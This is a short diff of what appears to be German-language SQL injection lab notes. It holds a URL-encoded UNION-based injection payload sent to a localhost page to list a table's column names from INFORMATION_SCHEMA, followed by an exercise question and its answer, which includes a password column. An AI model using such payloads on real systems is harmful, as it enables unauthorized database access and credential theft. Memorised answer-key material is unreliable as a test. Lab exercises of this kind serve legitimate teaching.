@@ -11,4 +11,4 @@ https://dev.mysql.com/doc/refman/8.0/en/information-schema-innodb-columns-table.
 http://localhost:82/index.php?id=2%27%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2C(SELECT%20GROUP_CONCAT(COLUMN_NAME)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%3D%27author%27)%2C0%3B--%20
 
 >>13) Welche Spalten enthält die Tabelle? Geben Sie die Spaltennamen in der Reihenfolge der Ausgabe und mit Leerzeichen getrennt an.<<
-      === id username name email password
+=== id username name email password
